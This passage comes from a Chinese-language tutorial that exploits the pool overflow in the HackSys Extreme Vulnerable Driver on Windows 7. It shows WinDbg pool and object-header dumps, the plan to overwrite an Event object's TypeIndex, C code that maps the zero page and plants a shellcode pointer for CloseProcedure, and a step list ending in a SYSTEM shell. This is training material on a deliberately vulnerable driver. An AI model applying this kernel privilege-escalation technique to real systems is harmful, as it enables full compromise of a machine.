       +0x006 PoolTagHash      : Uint2B
  * PreviousSize: 前一个chunk的BlockSize。
  * PoolIndex : 所在大pool的pool descriptor的index。这是用来检查释放pool的算法是否释放正确了。
  * PoolType: Free=0,Allocated=(PoolType|2)
  * PoolTag: 4个可打印字符，标明由哪段代码负责。(4 printable characters identifying the code responsible for the allocation)
我们在调试中查看下一个池的一些结构
    ...
    [+] Pool Chunk: 0x867C8CC8
    ...
    2: kd> !pool 0x867C8CC8
    ...
    *867c8cc0 size:  200 previous size:   40  (Allocated) *Hack
            Owning component : Unknown (update pooltag.txt)
     867c8ec0 size:   40 previous size:  200  (Allocated)  Even (Protected)
    ...
    2: kd> dd 867c8ec0
    867c8ec0  04080040 ee657645 00000000 00000040
    867c8ed0  00000000 00000000 00000001 00000001
    867c8ee0  00000000 0008000c 88801040 00000000
    867c8ef0  11040001 00000000 867c8ef8 867c8ef8
    867c8f00  00200008 ee657645 867bc008 867c8008
    867c8f10  00000000 00000000 00000000 00000000
    867c8f20  00000000 00080001 00000000 00000000
    867c8f30  74040001 00000000 867c8f38 867c8f38
    2: kd> dt nt!_POOL_HEADER 867c8ec0
       +0x000 PreviousSize     : 0y001000000 (0x40)
       +0x000 PoolIndex        : 0y0000000 (0)
       +0x002 BlockSize        : 0y000001000 (0x8)
       +0x002 PoolType         : 0y0000010 (0x2)
       +0x000 Ulong1           : 0x4080040
       +0x004 PoolTag          : 0xee657645
       +0x004 AllocatorBackTraceIndex : 0x7645
       +0x006 PoolTagHash      : 0xee65
    2: kd> dt nt!_OBJECT_HEADER_QUOTA_INFO 867c8ec0+8
       +0x000 PagedPoolCharge  : 0
       +0x004 NonPagedPoolCharge : 0x40
       +0x008 SecurityDescriptorCharge : 0
       +0x00c SecurityDescriptorQuotaBlock : (null) 
    2: kd> dt nt!_OBJECT_HEADER 867c8ec0+18
       +0x000 PointerCount     : 0n1
       +0x004 HandleCount      : 0n1
       +0x004 NextToFree       : 0x00000001 Void
       +0x008 Lock             : _EX_PUSH_LOCK
       +0x00c TypeIndex        : 0xc ''
       +0x00d TraceFlags       : 0 ''
       +0x00e InfoMask         : 0x8 ''
       +0x00f Flags            : 0 ''
       +0x010 ObjectCreateInfo : 0x88801040 _OBJECT_CREATE_INFORMATION
       +0x010 QuotaBlockCharged : 0x88801040 Void
       +0x014 SecurityDescriptor : (null) 
       +0x018 Body             : _QUAD
你可能会疑惑`_OBJECT_HEADER`和`_OBJECT_HEADER_QUOTA_INFO`是怎么分析出来的，这里你需要了解 Windows 7
的对象结构不然可能听不懂图片下面的那几行字，最好是在NT4源码(private\ntos\inc\ob.h)中搜索查看这些结构，这里我放一张图片吧
这里我简单说一下如何识别这两个结构的，根据下一块池的大小是 0x40
，在`_OBJECT_HEADER_QUOTA_INFO`结构中`NonPagedPoolCharge`的偏移为0x004刚好为池的大小，所以这里确定为`_OBJECT_HEADER_QUOTA_INFO`结构，又根据`InfoMask`字段在`_OBJECT_HEADER`中的偏移，结合我们确定的`_OBJECT_HEADER_QUOTA_INFO`结构掩码为0x8可以确定这里就是我们的`InfoMask`，这样推出`_OBJECT_HEADER`的位置在+0x18处，其实我们需要修改的也就是`_OBJECT_HEADER`中的`TypeIndex`字段，这里是0xc，我们需要将它修改为0，我们看一下`_OBJECT_HEADER`的结构
    3: kd> dt _OBJECT_HEADER
    nt!_OBJECT_HEADER
       +0x000 PointerCount     : Int4B
       +0x004 HandleCount      : Int4B
       +0x004 NextToFree       : Ptr32 Void
       +0x008 Lock             : _EX_PUSH_LOCK
       +0x00c TypeIndex        : UChar
       +0x00d TraceFlags       : UChar
       +0x00e InfoMask         : UChar
       +0x00f Flags            : UChar
       +0x010 ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION
       +0x010 QuotaBlockCharged : Ptr32 Void
       +0x014 SecurityDescriptor : Ptr32 Void
       +0x018 Body             : _QUAD
Windows 7 之后 `_OBJECT_HEADER` 及其之前的一些结构发生了变化，Windows
7之前0×008处的指向`_OBJECT_TYPE`的指针已经没有了, 取而代之的是在 0x00c
处的类型索引值。但Windows7中添加了一个函数`ObGetObjectType`，返回`Object_type`对象指针，也就是说根据索引值在`ObTypeIndexTable`数组中找到对应的`ObjectType`
    3: kd> u ObGetObjectType
    nt!ObGetObjectType:
    8405a7bd 8bff            mov     edi,edi
    8405a7bf 55              push    ebp
    8405a7c0 8bec            mov     ebp,esp
    8405a7c2 8b4508          mov     eax,dword ptr [ebp+8]
    8405a7c5 0fb640f4        movzx   eax,byte ptr [eax-0Ch]
    8405a7c9 8b04850059f483  mov     eax,dword ptr nt!ObTypeIndexTable (83f45900)[eax*4]
    8405a7d0 5d              pop     ebp
    8405a7d1 c20400          ret     4
我们查看一下`ObTypeIndexTable`数组，根据`TypeIndex`的大小我们可以确定偏移 0xc 处的 0x865f0598 即是我们
Event 对象的`OBJECT_TYPE`，我们这里主要关注的是`TypeInfo`中的`CloseProcedure`字段
    1: kd> dd nt!ObTypeIndexTable
    83f45900  00000000 bad0b0b0 86544768 865446a0
    83f45910  865445d8 865cd040 865cdf00 865cde38
    83f45920  865cdd70 865cdca8 865cdbe0 865cd528
    83f45930  865f0598 865f2418 865f2350 865f44c8
    83f45940  865f4400 865f4338 865f0040 865f0230
    83f45950  865f0168 865f19b8 865f18f0 865f1828
    83f45960  865f1760 865f1698 865f15d0 865f1508
    83f45970  865f1440 865ef6f0 865ef628 865ef560
    1: kd> dt nt!_OBJECT_TYPE 865f0598
       +0x000 TypeList         : _LIST_ENTRY [ 0x865f0598 - 0x865f0598 ]
       +0x008 Name             : _UNICODE_STRING "Event"
       +0x010 DefaultObject    : (null) 
       +0x014 Index            : 0xc ''
       +0x018 TotalNumberOfObjects : 0x1050
       +0x01c TotalNumberOfHandles : 0x10ac
       +0x020 HighWaterNumberOfObjects : 0x1e8a
       +0x024 HighWaterNumberOfHandles : 0x1ee6
       +0x028 TypeInfo         : _OBJECT_TYPE_INITIALIZER
       +0x078 TypeLock         : _EX_PUSH_LOCK
       +0x07c Key              : 0x6e657645
       +0x080 CallbackList     : _LIST_ENTRY [ 0x865f0618 - 0x865f0618 ]
    1: kd> dx -id 0,0,ffffffff889681e0 -r1 (*((ntkrpamp!_OBJECT_TYPE_INITIALIZER *)0xffffffff865f05c0))
    (*((ntkrpamp!_OBJECT_TYPE_INITIALIZER *)0xffffffff865f05c0))                 [Type: _OBJECT_TYPE_INITIALIZER]
        [+0x000] Length           : 0x50 [Type: unsigned short]
        [+0x002] ObjectTypeFlags  : 0x0 [Type: unsigned char]
        [+0x002 ( 0: 0)] CaseInsensitive  : 0x0 [Type: unsigned char]
        [+0x002 ( 1: 1)] UnnamedObjectsOnly : 0x0 [Type: unsigned char]
        [+0x002 ( 2: 2)] UseDefaultObject : 0x0 [Type: unsigned char]
        [+0x002 ( 3: 3)] SecurityRequired : 0x0 [Type: unsigned char]
        [+0x002 ( 4: 4)] MaintainHandleCount : 0x0 [Type: unsigned char]
        [+0x002 ( 5: 5)] MaintainTypeList : 0x0 [Type: unsigned char]
        [+0x002 ( 6: 6)] SupportsObjectCallbacks : 0x0 [Type: unsigned char]
        [+0x004] ObjectTypeCode   : 0x2 [Type: unsigned long]
        [+0x008] InvalidAttributes : 0x100 [Type: unsigned long]
        [+0x00c] GenericMapping   [Type: _GENERIC_MAPPING]
        [+0x01c] ValidAccessMask  : 0x1f0003 [Type: unsigned long]
        [+0x020] RetainAccess     : 0x0 [Type: unsigned long]
        [+0x024] PoolType         : NonPagedPool (0) [Type: _POOL_TYPE]
        [+0x028] DefaultPagedPoolCharge : 0x0 [Type: unsigned long]
        [+0x02c] DefaultNonPagedPoolCharge : 0x40 [Type: unsigned long]
        [+0x030] DumpProcedure    : 0x0 [Type: void (*)(void *,_OBJECT_DUMP_CONTROL *)]
        [+0x034] OpenProcedure    : 0x0 [Type: long (*)(_OB_OPEN_REASON,char,_EPROCESS *,void *,unsigned long *,unsigned long)]
        [+0x038] CloseProcedure   : 0x0 [Type: void (*)(_EPROCESS *,void *,unsigned long,unsigned long)]
        [+0x03c] DeleteProcedure  : 0x0 [Type: void (*)(void *)]
        [+0x040] ParseProcedure   : 0x0 [Type: long (*)(void *,void *,_ACCESS_STATE *,char,unsigned long,_UNICODE_STRING *,_UNICODE_STRING *,void *,_SECURITY_QUALITY_OF_SERVICE *,void * *)]
        [+0x044] SecurityProcedure : 0x840675b6 [Type: long (*)(void *,_SECURITY_OPERATION_CODE,unsigned long *,void *,unsigned long *,void * *,_POOL_TYPE,_GENERIC_MAPPING *,char)]
        [+0x048] QueryNameProcedure : 0x0 [Type: long (*)(void *,unsigned char,_OBJECT_NAME_INFORMATION *,unsigned long,unsigned long *,char)]
        [+0x04c] OkayToCloseProcedure : 0x0 [Type: unsigned char (*)(_EPROCESS *,void *,void *,char)]
我们的最后目的是把`CloseProcedure`字段覆盖为指向shellcode的指针，因为在最后会调用这些函数，把这里覆盖自然也就可以执行我们的shellcode，我们希望这里能够将Event这个结构放在我们能够操控的位置，在
Windows 7 中我们知道是可以在用户模式下控制0页内存的，所以我们希望这里能够指到0页内存，所以我们想把`TypeIndex`从0xc修改为0x0，在
Windows 7
下`ObTypeIndexTable`的前八个字节始终为0，所以可以在这里进行构造，需要注意的是，这里我们需要申请0页内存，我们传入的第二个参数不能是0，如果是0系统就会随机给我们分配一块内存，我们希望的是分配0页，如果传入1的话由于内存对齐就可以申请到0页内存，然后就可以放入我们shellcode的位置了
    PVOID   Zero_addr = (PVOID)1;
    SIZE_T  RegionSize = 0x1000;
    *(FARPROC*)& NtAllocateVirtualMemory = GetProcAddress(
        GetModuleHandleW(L"ntdll"),
        "NtAllocateVirtualMemory");
    if (NtAllocateVirtualMemory == NULL)
    {
        printf("[+]Failed to get function NtAllocateVirtualMemory!!!\n");
        system("pause");
        return 0;
    }
    printf("[+]Started to alloc zero page...\n");
    if (!NT_SUCCESS(NtAllocateVirtualMemory(
        INVALID_HANDLE_VALUE,
        &Zero_addr,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE)) || Zero_addr != NULL)
    {
        printf("[+]Failed to alloc zero page!\n");
        system("pause");
        return 0;
    }
    printf("[+]Success to alloc zero page...\n");
    *(DWORD*)(0x60) = (DWORD)& ShellCode;
最后我们整合一下代码就可以提权了，总结一下步骤
  * 初始化句柄等结构
  * 构造池头结构
  * 申请0页内存并放入shellcode位置
  * 堆喷射构造间隙
  * 调用`TriggerPoolOverflow`函数
  * 关闭句柄
  * 调用cmd提权
最后提权效果如下，详细代码参考[这里](https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/PoolOverflow/PoolOverflow/PoolOverflow.c)
# 0x03：后记
这里放一些调试的小技巧，以判断每一步是否正确，在`memcpy`处下断点，p单步运行可观察下一个池是否构造完成，`dd
0x0`观察0页内存查看0x60处的指针是否指向shellcode，在该处下断点运行可以观察到是否运行了我们的shellcode，源码中的调试就是用`__debugbreak()`下断点观察即可